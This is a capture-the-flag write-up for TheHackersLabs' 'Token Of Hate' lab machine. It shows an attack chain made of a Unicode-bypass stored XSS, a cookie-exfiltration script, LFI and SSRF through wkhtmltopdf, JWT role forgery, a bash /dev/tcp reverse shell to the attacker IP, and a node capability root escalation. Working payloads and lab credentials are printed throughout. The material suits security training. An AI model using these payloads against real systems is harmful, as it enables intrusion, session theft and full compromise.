---
author: Lenam
pubDatetime: 2025-03-22T00:00:00Z
title: WriteUp Token Of Hate - TheHackersLabs
slug: token-of-hate-writeup-thehackerslabs-en
featured: true
draft: false
ogImage: "assets/token-of-hate/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - xss
  - ssrf
  - lfi
  - rce
  - capabilities
  - cookie hijacking
description:
  Resolution of a TheHackersLabs CTF, involving enumeration, stored XSS exploitation via Unicode, cookie hijacking, LFI and SSRF attacks, JWT manipulation for RCE, and privilege escalation via capabilities on Linux.
lang: en
---
![Rabbit Token Of Hate](/assets/token-of-hate/OpenGraph.png)

Resolution of a TheHackersLabs CTF, involving enumeration, stored XSS exploitation via Unicode, cookie hijacking, LFI and SSRF attacks, JWT manipulation for RCE, and privilege escalation via capabilities on Linux.

## Table of Contents

## Enumeration

![alt text](/assets/token-of-hate/image.png)

We send a ping and observe, by the TTL value of 64, that it is a machine running `Linux`.

```bash
$ ping -c 1 192.168.1.117
PING 192.168.1.117 (192.168.1.117) 56(84) bytes of data.
64 bytes from 192.168.1.117: icmp_seq=1 ttl=64 time=0.195 ms

--- 192.168.1.117 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.195/0.195/0.195/0.000 ms
```

We begin by running a quick scan of all the machine’s ports.

```bash
$ nmap -p- -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:22 CET
Nmap scan report for 192.168.1.117
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

We find two open ports, 22 (`ssh`) and 80 (`http`). Next, we perform a more exhaustive scan to gather more information about the services running on ports 80 and 22.

```bash
$ nmap -p22,80 -sVC -T4 -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:23 CET
Nmap scan report for 192.168.1.117
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 fd6a7017f74007feeb5a5d365632f039 (ECDSA)
|_  256 2d3d4ba1f6e38d91094ca8b3857db5c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```

We do not discover anything further with the exhaustive nmap scan. We run `whatweb` in case it can provide us with more details about the website.

```bash
$ whatweb -v 192.168.1.117
WhatWeb report for http://192.168.1.117
Status    : 200 OK
Title     : Home
IP        : 192.168.1.117
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.62 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.62 (Debian) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 21 Mar 2025 20:44:12 GMT
        Server: Apache/2.4.62 (Debian)
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 1504
        Connection: close
        Content-Type: text/html; charset=UTF-8

```

We also run a `fuzzing` scan for various endpoints or files within the web service using `gobuster` with the `directory-list-2.3-medium.txt` dictionary from `seclist`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.117 -x .php,.txt,.zip,.db,.htm,.html,.phar,.db,.asp,.aspx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,php,txt,htm,phar,aspx,zip,db,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2952]
/login.php            (Status: 200) [Size: 1054]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.117/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/registro.php         (Status: 200) [Size: 1089]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 2205590 / 2205600 (100.00%)
===============================================================
Finished
===============================================================

```

### Manual Enumeration

We open the website at port 80 in our browser.

![alt text](/assets/token-of-hate/image-1.png)

We find a website that, upon closer inspection, provides some hints about the intrusion process.

- It explains that the application, intended for internal use, transforms the usernames into their equivalent ASCII characters.
- It also states that the administrator user will always be reviewing new registrations.

Additionally, there are two links: one leading to a registration form called `Ir a Registro`.

![alt text](/assets/token-of-hate/image-2.png)

With the following source code:

**registro.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Registro</title>
  <link rel="stylesheet" href="hoja.css">

  <script>
    // Validación en el cliente: se rechazan los caracteres prohibidos (<, >, ", ', &)
    function validarUsername() {
      /*
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
        */
      return true;
    }
  </script>
</head>
<body>
  <h1 class="blink">Registro</h1>
  <form action="procesarRegistro.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Registrarse">
  </form>
  <p><a href="login.php">Ir a Login</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>

```

And another link that shows the login form, `Ir a Login`.

![alt text](/assets/token-of-hate/image-3.png)

With the following source code:

**login.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <script>
    // Validación en el cliente para evitar caracteres HTML prohibidos
    function validarUsername() {
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
      return true;
    }
  </script>
  <link rel="stylesheet" href="hoja.css">

</head>
<body>
  <h1 class="blink">Login</h1>
  <form action="procesarLogin.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Iniciar Sesión">
  </form>
  <p><a href="registro.php">Ir a Registro</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>
```

We register with any username and password, then log in with the same credentials, and we see a private page.

![alt text](/assets/token-of-hate/image-4.png)

By inspecting the source code of this page, we find more hints in the comments.

**pagina_privada.php**

```html
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>Página Privada</title>
    <link rel="stylesheet" href="hoja.css">
</head>

<body>
    <h1>Página Privada</h1>
    <p>Bienvenido, lenam!</p>

    <!-- Sección visible para todos los usuarios validados -->
    <section id="seccion_users">
        <h2>Contenido para Usuarios</h2>
        <p>Este contenido es visible para todos los usuarios autenticados (roles "user" y "admin").</p>
    </section>

    <!-- Sección exclusiva para usuarios con rol "admin" -->
  

    <p><a href="logout.php">Cerrar sesión</a></p>
</body>

</html>
```

We notice the browser cookie created by our logged-in session does not have the `HttpOnly`, `Secure`, or `SameSite` flags set.

![alt text](/assets/token-of-hate/image-5.png)

## Intrusion

### Intrusion Hints

- On the main page `index.php`, it explains that the administrator user is reviewing new user registrations.
- On the main page, it also explains that Unicode characters can be used for usernames, which are then transformed to ASCII internally.
- From `whatweb` headers, we see that there is no `CSP` header for XSS protection, nor any `CORS` headers set.
- The session cookie generated by the application has no protection from being read or sent.
- In the source code of `login.php`, we see the characters `<>"'&` are not allowed for the username.

### Stored XSS

First, we need to create a user that allows us to insert a script into the page (Stored XSS). To achieve this, we take advantage of `Unicode` characters. If we try to insert one of the forbidden characters `<>"'&`, we will fail, but we can replace these characters with equivalents that exist only in `Unicode`. Once converted internally to ASCII, we get the desired effect.

| ASCII | Unicode |
| :---: | ------- |
|   <   | ＜      |
|   >   | ＞      |
|   "   | “      |
|   '   | ’      |
|   &   | ＆      |

We prepare a small bash script to facilitate this.

```bash
#!/usr/bin/env bash
#
# Uso:
#   ./transformar.sh "Texto con & < > ' y \""
#
# El script imprimirá el texto transformado por stdout con posibles equivalente ASCII en unicode

INPUT="$1"

#    - &   => ＆ (U+FF06, Fullwidth Ampersand)
#    - <   => ＜ (U+FF1C, Fullwidth Less-Than Sign)
#    - >   => ＞ (U+FF1E, Fullwidth Greater-Than Sign)
#    - '   => ’ (U+2019, Right Single Quotation Mark)
#    - "   => “ (U+201C, Left Double Quotation Mark)
OUTPUT="$(echo "$INPUT" | sed -E \
  -e 's/&/＆/g' \
  -e 's/</＜/g' \
  -e 's/>/＞/g' \
  -e "s/'/’/g" \
  -e 's/\"/“/g'
)"

echo "$OUTPUT"
```

We could also do it manually. In our case, we run the following command and copy the result to use as our username upon registration.

```bash
./transformar.sh '<script src="http://[IP-atacante]/script.js"></script>'
```

In my case:

```bash
$ ./tranformar.sh '<script src="http://192.168.1.181/script.js"></script>'
＜script src=“http://192.168.1.181/script.js“＞＜/script＞
```

![alt text](/assets/token-of-hate/image-6.png)

Meanwhile, we create a python web server listening on port 80, and soon enough, we receive a request.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [21/Mar/2025 23:41:21] code 404, message File not found
192.168.1.117 - - [21/Mar/2025 23:41:21] "GET /script.js HTTP/1.1" 404 -
```

### Cookie Hijacking

Because the Stored XSS continuously requests our `script.js` file, we simply need to keep modifying that file to execute JavaScript in the victim’s browser.

We run the following code to create the `script.js` file in the same folder our web server is sharing.

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://[IP-atacante]?cookie="+btoa(document.cookie));x.send();' > script.js
```

In my case:

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://192.168.1.181?cookie="+btoa(document.cookie));x.send();' > script.js
```

We then receive a user’s cookie in base64 format in our web server logs.

```bash
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /?cookie=UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo HTTP/1.1" 200 -
```

We decode the base64 of the cookie and see that it is the same session cookie that was created upon our login, but with a different value.

```bash
$ echo UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo | base64 -d
PHPSESSID=sd3q3eeg0v7cl3phim5r21iqah  
```

We log in with our initial test user in the browser (if needed, create another user via the registration form). Once logged in, from the browser developer tools in the `Storage > Cookies` tab, we modify the session cookie `PHPSESSID` with the one we received on our web server, and then refresh the page.

![alt text](/assets/token-of-hate/image-7.png)

We then gain access as an administrator user in the web application, allowing us to see all registered users, delete them, and download a PDF containing all users.

![alt text](/assets/token-of-hate/image-8.png)

### Local File Inclusion (LFI)

When generating the PDF document, we notice that our web server receives requests but with no data for the cookie.

```
192.168.1.117 - - [22/Mar/2025 00:00:31] "GET /?cookie= HTTP/1.1" 200 -
```

We download the generated PDF listing the users and analyze it.

![alt text](/assets/token-of-hate/image-9.png)

Using `exiftool`, we see it was generated with `wkhtmltopdf 0.12.6`, a popular tool for transforming `HTML` into `PDF`.

We modify the `script.js` file on our python web server in an attempt to read files from the server.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<pre>"+this.responseText+"</pre>");
};
x.open("GET","file:///etc/passwd");
x.send();
```

We download the PDF and obtain the `/etc/passwd` file.

![alt text](/assets/token-of-hate/image-10.png)

We can continue reading various server files, but we find leaked credentials in `/var/www/html/index.php`.

![alt text](/assets/token-of-hate/image-11.png)

We record them for future reference.

```text
['admin', 'dUnAyw92B7qD4OVIqWXd', 'admin'],
['Łukasz', 'dQnwTCpdCUGGqBQXedLd', 'user'],
['Þór', 'EYNlxMUjTbEDbNWSvwvQ', 'user'],
['Ægir', 'DXwgeMuQBAtCWPPQpJtv', 'user'],
['Çetin', 'FuLqqEAErWQsmTQQQhsb', 'user'],
['José', 'FuLqqEAErWQsmTQQQhsb', 'user'],
```

### Internal Resource Requests (SSRF)

We use the same Stored XSS to probe for internal server resources. We again modify `script.js` on our web server to run an internal port scan of the most common `http` ports. Remember to replace the IP `192.168.1.181` with that of your web server.

```javascript
const ports=[66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821];
function handleLoad(x,p) {
  let y=new XMLHttpRequest();
  y.open("GET",`http://192.168.1.181/ping?port=${p}`);
  y.send();
}
ports.forEach( (p,i) =>
  setTimeout( () => {
    let x=new XMLHttpRequest();
    x.open("GET",`http://localhost:${p}`);
    x.timeout=300;
    x.onload=()=>handleLoad(x,p);x.send();
  }, i*10)
);
```

We observe that, in addition to port `80`, port `3000` is also open internally.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [22/Mar/2025 00:24:05] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /ping?port=80 HTTP/1.1" 404 - <---
192.168.1.117 - - [22/Mar/2025 00:24:06] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:06] "GET /ping?port=3000 HTTP/1.1" 404 - <---
```

We then modify `script.js` again to view the response on port 80.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<div>"+this.responseText+"</div>")
};
x.open("GET","http://localhost:3000");
x.send();
```

We download the PDF and see JSON data.

![alt text](/assets/token-of-hate/image-12.png)

```json
{
   "name":"API de Comandos",
   "version":"1.2.0",
   "description":"API para autenticación y ejecución de comandos utilizando
un token.",
   "endpoints":{
      "/":{
         "method":"GET",
         "description":"Muestra la información de la API y la descripción de los
endpoints disponibles."
      },
      "/login":{
         "method":"POST",
         "description":"Permite iniciar sesión. Se espera un body en formato
JSON con 'username' y 'password'. Si el login es correcto, se retorna un token JWT. Ejemplo: { \"username\": \"test\",
\"password\": \"123456\" }"
      },
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
   }
}
```

It appears to be the manual for an internal API that allows command execution. We again modify our `script.js` file to try logging in with the users we found in `/var/www/html/index.php`.

Also, because the application internally uses the ASCII version of usernames, we add them to the list of users, converting their special characters to ASCII, including a lowercase version as well.

```javascript
const users = [
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Łukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Þór", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "Ægir", ipasd: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Çetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "José", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "AEgir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "Jose", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios y en minusculas.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "aegir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "jose", pas: "FuLqqEAErWQsmTQQQhsb" }
];

function testUser(user) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
        if (xhr.status >= 200)
            new Image().src = `http://192.168.1.181/?user=${user.username}&response=${btoa(xhr.responseText)}`
    }
    xhr.send(JSON.stringify(user));
}

users.forEach(async user => {
    // Envía la petición con el body en JSON
    testUser({
        username: user.nombre,
        password: user.pas
    });
});
```

We wait a moment, and soon we get all the requests to our web server. Examining them closely, we see the largest response data belongs to `Jose` (capitalized, no accent).

![alt text](/assets/token-of-hate/image-13.png)

We decode the base64 of the login response for user `Jose`.

```bash
$ echo eyJtZXNzYWdlIjoiTG9naW4gY29ycmVjdG8iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeWJtRnRaU0k2SWtwdmMyVWlMQ0p5YjJ4bElqb2lkWE5sY2lJc0ltbGhkQ0k2TVRjME1qWXdNalF3TWl3aVpYaHdJam94TnpReU5qQTJNREF5ZlEuWFEwT1QzWng4VmYtZGlpNmxQX0hFNER6emYtOVQxWUhuVlk3VXhPTWU2cyJ9|base64 -d
{"message":"Login correcto","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s"}
```

We get JSON with a message and a token, as indicated by the API’s main endpoint, seemingly a JWT.

### Remote Code Execution (RCE)

We decode the JWT token to identify the validity period, encryption type, and payload details.

**JWT Token Obtained**

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s
```

We use http://jwt.io to decode it.

![alt text](/assets/token-of-hate/image-14.png)

We see that the token uses the `HS256` algorithm (the `alg` parameter in the HEADER) and the login validity period is 1 hour. This is determined by the `exp` (in UNIX timestamp) and `iat` (also in UNIX timestamp) fields in the PAYLOAD.

```
1742606002 - 1742602402 = 3600 seconds = 1 hour
```

Hence, if we take more than an hour to use this token, we need a new one by logging in again. We also see in the PAYLOAD that the token belongs to the user `Jose` with the role `user`.

We want to execute a command on the internal `/command` endpoint. Recalling the information we obtained, it indicates that it only works with the role `admin`, but the token we got from user `Jose` is `user`.

```json
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
```

We can modify the JWT token to change the `role` parameter in the PAYLOAD. If the backend doesn’t validate the token signature properly, we can impersonate a user with the `admin` role.

We can do this manually or using the following script, which automates the process. We modify our `script.js` again:

```javascript
var command = "id";

// Petición para realizar el login y obtener el token actualizado.
petition1 = new XMLHttpRequest();
petition1.open('POST', 'http://localhost:3000/login', true);
petition1.setRequestHeader('Content-Type', 'application/json');

// Petición para ejecutar el comando.
petition2 = new XMLHttpRequest();
petition2.open('POST', 'http://localhost:3000/command', true);
petition2.setRequestHeader('Content-Type', 'application/json');

function base64urlDecode(str) {
    // Reemplaza caracteres específicos de Base64URL
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    // Añadir padding si es necesario
    while (str.length % 4) {
        str += '=';
    }
    return atob(str);
}

function base64urlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

petition2.onload = () => {
    document.write("Resultado");
    document.write(petition2.responseText);
}

petition1.onload = () => {
    // Obtenemos el token JWT y lo separamos en sus partes.
    let tokenParts = JSON.parse(petition1.responseText).token.split(".");

    // Decodificamos la parte del payload y la convertimos en objeto.
    let payloadDecoded = JSON.parse(base64urlDecode(tokenParts[1]));

    // Modificamos el role del usuario.
    payloadDecoded.role = "admin";

    // Codificamos nuevamente el payload modificado.
    tokenParts[1] = base64urlEncode(JSON.stringify(payloadDecoded));

    // Reconstruimos el token modificado.
    let tokenModificado = tokenParts.join(".");

    sendSecondPetition(tokenModificado);
}

function sendSecondPetition(tokenModificado) {
    petition2.send(`{"token":"${tokenModificado}","command":"${command}"}`);
}

petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
```

We download another PDF, and we achieve command execution as user `ctesias`.

![alt text](/assets/token-of-hate/image-15.png)

We modify the first variable `command` in our `script.js` to place our attacker machine’s IP address:

```javascript
var command = "bash -c 'bash -i >& /dev/tcp/192.168.1.181/12345 0>&1'";
```

We listen with netcat on port `12345`, then create another PDF document.

```bash
$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.1.181] from (UNKNOWN) [192.168.1.117] 40170
bash: no se puede establecer el grupo de proceso de terminal (497): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
ctesias@tokenofhate:/$ 
```

We successfully get into the victim machine as `ctesias`.

![alt text](/assets/token-of-hate/image-16.png)

We read the user.txt flag.

```bash
tesias@tokenofhate:~$ cat user.txt
cat user.txt
98XXXXXXXXXXXXXXXXXXXXXXXXXXXXa3
```

## Privilege Escalation

We configure our terminal session or add our SSH public key to work more comfortably on the server.

We look for files with capabilities set.

```bash
$ getcap -r /
getcap -r /
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/yournode cap_setuid=ep
```

We see a suspicious binary `/usr/bin/yournode`, which we discover is a copy of `nodejs`.

```bash
$ /usr/bin/yournode
Welcome to Node.js v18.19.0.
Type ".help" for more information.
> .exit
$ /usr/bin/yournode --version
v18.19.0
```

We search in `gtfobins` for a way to escalate with `node` and capabilities, and we find one.

![alt text](/assets/token-of-hate/image-17.png)

We run the following command to obtain root privileges.

```bash
ctesias@tokenofhate:~$ /usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# id
uid=0(root) gid=1000(ctesias) grupos=1000(ctesias),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
# 
```

We can read the `root.txt` flag.

```bash
# cat /root/root.txt
b6XXXXXXXXXXXXXXXXXXXXXX2d
```

Congratulations! If you’ve made it this far, you have obtained the flags, but you might still not have found everything.

Did you notice the `hate` rabbit image at the beginning? It’s also part of this CTF. If you haven’t found it, it means you didn’t look everywhere. 😉
